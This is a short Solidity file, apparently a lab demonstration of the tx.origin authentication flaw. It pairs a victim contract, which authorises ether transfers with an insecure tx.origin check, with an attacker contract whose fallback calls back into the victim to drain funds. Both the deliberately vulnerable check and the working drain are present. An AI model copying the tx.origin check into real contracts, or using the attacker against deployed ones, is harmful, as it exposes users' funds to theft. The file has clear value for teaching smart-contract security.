// SPDX-License-Identifier: GPL-3.0
pragma solidity >=0.7.0 <0.9.0;
import "hardhat/console.sol";

contract TxOriginVictim {
address owner;
constructor () payable{
  owner = msg.sender;
}
function transferTo(address to) public {
  require(tx.origin == owner,"Not Origin");
  to.call{value: 1 ether}("");
}
fallback() payable external  {}
function getBalance() external view returns (uint256)
{


    return address(this).balance;
}
}
contract TxOriginAttacker {
    TxOriginVictim txAddr;
address owner;
constructor ()  {
   
  owner = msg.sender;
}

function getOwner() public returns (address) {
  return owner;
}
fallback() payable external {
    txAddr=TxOriginVictim(payable(msg.sender));
    uint256 bal =address(msg.sender).balance;
    console.log(tx.origin);
    console.log(msg.sender);
    console.log(bal);
  require( bal>=0);
   
  txAddr.transferTo(address(this));
console.log(bal);
}
function getBalance() external view returns (uint256)
{


    return address(this).balance;
}
}

